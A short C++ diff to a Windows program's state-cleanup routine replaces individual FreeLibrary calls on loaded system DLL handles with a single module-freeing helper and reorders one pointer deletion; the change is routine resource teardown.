@@ -20,24 +20,14 @@ namespace State
             pState->hRequest
         );
 
-        // Free loaded modules.
-        FreeLibrary(pState->hAdvapi32DLL);
-        FreeLibrary(pState->hBcryptDLL);
-        FreeLibrary(pState->hCrypt32DLL);
-        FreeLibrary(pState->hDbghelpDLL);
-        FreeLibrary(pState->hIphlpapiDLL);
-        FreeLibrary(pState->hKernel32DLL);
-        FreeLibrary(pState->hNetapi32DLL);
-        FreeLibrary(pState->hNTDLL);
-        FreeLibrary(pState->hShell32DLL);
-        FreeLibrary(pState->hUser32DLL);
-        FreeLibrary(pState->hWinHTTPDLL);
+        // Free loaded module handlers.
+        Modules::Free(pState->pModules);
 
         delete pState->pCrypt->pAES;
         delete pState->pCrypt;
-        delete pState->pTeb;
         delete pState->pProcs;
         // delete pState->pSocket;
+        delete pState->pTeb;
         delete pState;
     }
 }
